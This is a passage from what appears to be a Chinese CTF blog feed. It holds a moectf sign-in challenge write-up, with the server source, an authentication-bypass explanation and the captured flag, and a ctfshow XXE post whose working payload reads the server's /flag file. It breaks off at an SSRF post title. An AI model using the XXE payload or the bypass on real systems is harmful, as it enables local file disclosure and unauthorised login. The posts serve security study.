class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> users, salt<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> http.server<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    FLAG = f.read().strip()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gethash</span>(<span class="hljs-params">*items</span>):<br>    c = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-keyword">if</span> item <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        c ^= <span class="hljs-built_in">int</span>.from_bytes(hashlib.md5(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;salt&#125;</span>[<span class="hljs-subst">&#123;item&#125;</span>]<span class="hljs-subst">&#123;salt&#125;</span>&quot;</span>.encode()).digest(), <span class="hljs-string">&quot;big&quot;</span>) <span class="hljs-comment"># it looks so complex! but is it safe enough?</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]<br><br><span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> users<br><span class="hljs-keyword">assert</span> users[<span class="hljs-string">&quot;admin&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span><br><br>hashed_users = <span class="hljs-built_in">dict</span>((k,gethash(k,v)) <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> users.items())<br><br><span class="hljs-built_in">eval</span>(<span class="hljs-built_in">int</span>.to_bytes(<span class="hljs-number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span>^<span class="hljs-number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span>,<span class="hljs-number">160</span>,<span class="hljs-string">&quot;big&quot;</span>,signed=<span class="hljs-literal">True</span>).decode().translate(&#123;<span class="hljs-built_in">ord</span>(c):<span class="hljs-literal">None</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;\x00&quot;</span>&#125;)) <span class="hljs-comment"># what is it?</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data:<span class="hljs-built_in">str</span></span>):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            data = base64.b64encode(data).decode() <span class="hljs-comment"># ummm...? It looks like it&#x27;s just base64 encoding it 5 times? truely?</span><br>        <span class="hljs-keyword">return</span> data<br><br>__page__ = base64.b64encode(<span class="hljs-string">&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg==&quot;</span>)<br>        <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span>(http.server.BaseHTTPRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_GET</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.path == <span class="hljs-string">&quot;/&quot;</span>:<br>                self.send_response(<span class="hljs-number">200</span>)<br>                self.end_headers()<br>                self.wfile.write(__page__)<br>            <span class="hljs-keyword">else</span>:<br>                self.send_response(<span class="hljs-number">404</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;404 Not Found&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            self.send_response(<span class="hljs-number">500</span>)<br>            self.end_headers()<br>            self.wfile.write(<span class="hljs-string">b&quot;500 Internal Server Error&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_POST</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.path == <span class="hljs-string">&quot;/login&quot;</span>:<br>                body = self.rfile.read(<span class="hljs-built_in">int</span>(self.headers.get(<span class="hljs-string">&quot;Content-Length&quot;</span>)))<br>                payload = json.loads(body)<br>                params = json.loads(decrypt(payload[<span class="hljs-string">&quot;params&quot;</span>]))<br>                <span class="hljs-built_in">print</span>(params)<br>                <span class="hljs-keyword">if</span> params.get(<span class="hljs-string">&quot;username&quot;</span>) == <span class="hljs-string">&quot;admin&quot;</span>:<br>                    self.send_response(<span class="hljs-number">403</span>)<br>                    self.end_headers()<br>                    self.wfile.write(<span class="hljs-string">b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;admin&quot;</span>)<br>                    <span class="hljs-keyword">return</span><br>                <span class="hljs-keyword">if</span> params.get(<span class="hljs-string">&quot;username&quot;</span>) == params.get(<span class="hljs-string">&quot;password&quot;</span>):<br>                    self.send_response(<span class="hljs-number">403</span>)<br>                    self.end_headers()<br>                    self.wfile.write(<span class="hljs-string">b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;same&quot;</span>)<br>                    <span class="hljs-keyword">return</span><br>                hashed = gethash(params.get(<span class="hljs-string">&quot;username&quot;</span>),params.get(<span class="hljs-string">&quot;password&quot;</span>))<br>                <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> hashed_users.items():<br>                    <span class="hljs-keyword">if</span> hashed == v:<br>                        data = &#123;<br>                            <span class="hljs-string">&quot;user&quot;</span>:k,<br>                            <span class="hljs-string">&quot;hash&quot;</span>:hashed,<br>                            <span class="hljs-string">&quot;flag&quot;</span>: FLAG <span class="hljs-keyword">if</span> k == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span><br>                        &#125;<br>                        self.send_response(<span class="hljs-number">200</span>)<br>                        self.end_headers()<br>                        self.wfile.write(json.dumps(data).encode())<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success&quot;</span>)<br>                        <span class="hljs-keyword">return</span><br>                self.send_response(<span class="hljs-number">403</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;Invalid username or password&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                self.send_response(<span class="hljs-number">404</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;404 Not Found&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            self.send_response(<span class="hljs-number">500</span>)<br>            self.end_headers()<br>            self.wfile.write(<span class="hljs-string">b&quot;500 Internal Server Error&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    server = http.server.HTTPServer((<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">9999</span>), MyHandler)<br>    server.serve_forever()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gethash</span>(<span class="hljs-params">*items</span>):<br>    c = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-keyword">if</span> item <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        c ^= <span class="hljs-built_in">int</span>.from_bytes(hashlib.md5(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;salt&#125;</span>[<span class="hljs-subst">&#123;item&#125;</span>]<span class="hljs-subst">&#123;salt&#125;</span>&quot;</span>.encode()).digest(), <span class="hljs-string">&quot;big&quot;</span>) <span class="hljs-comment"># it looks so complex! but is it safe enough?</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]<br></code></pre></td></tr></table></figure><ul><li>^:按位异或运算符：当两对应的二进位相异时，结果为1</li><li><a href="https://blog.csdn.net/Clovera/article/details/79293108">int.from_bytes()</a>: res &#x3D; int.from_bytes(x)的含义是把bytes类型的变量x，转化为十进制整数，并存入res中。</li><li>hashlib.md5()：哈希MD5加密</li><li>hex(c)[2:]:转换为16进制[2:]从第二位数开始读起</li></ul><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">def</span> decrypt(<span class="hljs-class"><span class="hljs-keyword">data</span>:str):</span><br>        for x <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):<br>            <span class="hljs-class"><span class="hljs-keyword">data</span> = base64.b64encode(<span class="hljs-title">data</span>).decode() # ummm...? <span class="hljs-type">It</span> looks like it&#x27;s just base64 encoding it 5 times? truely?</span><br>        return <span class="hljs-class"><span class="hljs-keyword">data</span></span><br></code></pre></td></tr></table></figure><p>这里data base64加密了5次，所以抓包到的params要进行5次base64解码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashed = <span class="hljs-built_in">gethash</span>(params<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;username&quot;</span>),params<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;password&quot;</span>))<br>                <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> hashed_users<span class="hljs-selector-class">.items</span>():<br>                    <span class="hljs-keyword">if</span> hashed == v:<br>                        data = &#123;<br>                            <span class="hljs-string">&quot;user&quot;</span>:k,<br>                            <span class="hljs-string">&quot;hash&quot;</span>:hashed,<br>                            <span class="hljs-string">&quot;flag&quot;</span>: FLAG <span class="hljs-keyword">if</span> k == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span><br>                        &#125;<br>                        self<span class="hljs-selector-class">.send_response</span>(<span class="hljs-number">200</span>)<br>                        self<span class="hljs-selector-class">.end_headers</span>()<br>                        self<span class="hljs-selector-class">.wfile</span><span class="hljs-selector-class">.write</span>(json<span class="hljs-selector-class">.dumps</span>(data)<span class="hljs-selector-class">.encode</span>())<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success&quot;</span>)<br>                        return<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> hashed_users<span class="hljs-selector-class">.items</span>()<br><br>hashed_users = <span class="hljs-built_in">dict</span>((k,<span class="hljs-built_in">gethash</span>(k,v)) <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> users<span class="hljs-selector-class">.items</span>())<br><br>assert <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> users<br>assert users<span class="hljs-selector-attr">[<span class="hljs-string">&quot;admin&quot;</span>]</span> == <span class="hljs-string">&quot;admin&quot;</span><br></code></pre></td></tr></table></figure><p>hashed_users&#x3D;{‘admin’,0},k为admin，v为0<br>if hashed &#x3D;&#x3D; v:  hashed对我们传入的username和password进行异或(^),两者相同为0<br>所以我们的username和password要相等，但代码有说明username!&#x3D;password，好在是弱比较，我们可以数字和数字字符比较</p><p><img src="/images/GCGH3S1RWUG78DVN.png"></p><p><img src="/images/USTULSP1TF6QD9N6L.png"></p><p>flag</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;C0nGUrAti0ns!_y0U_hAve_sUCCessFUlly_siGnin!_iYlJf!M3rux9G9Vf!Jox&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>xxe</title>
    <link href="/2023/10/06/xxe/"/>
    <url>/2023/10/06/xxe/</url>
    
    <content type="html"><![CDATA[<h1 id="XXE漏洞介绍"><a href="#XXE漏洞介绍" class="headerlink" title="XXE漏洞介绍"></a>XXE漏洞介绍</h1><p><a href="https://xz.aliyun.com/t/3357">XXE漏洞详解</a></p><h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-comment">// 加载xml实体，参数为替代实体、加载外部子集</span><br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-comment">// 把 DOM 节点转换为 SimpleXMLElement 对象</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-comment">// 节点嵌套</span><br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br></code></pre></td></tr></table></figure><p><code>libxml_disable_entity_loader(false);</code><br>禁止加载外部实体。一个实体由三部分构成：一个和号(&amp;),一个实体名称，以及一个分号(;)<br>flag的路径是&#x2F;flag</p><p>在burpsuite中post</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">XXE</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">cmd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">yasuo</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><span class="hljs-symbol">&amp;cmd;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">yasuo</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/DUBZ2H8DZH1GVXQ7GNM5.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ssrf</title>
    <link href="/2023/09/26/ssrf/"/>
    <url>/2023/09/26/ssrf/</url>
    
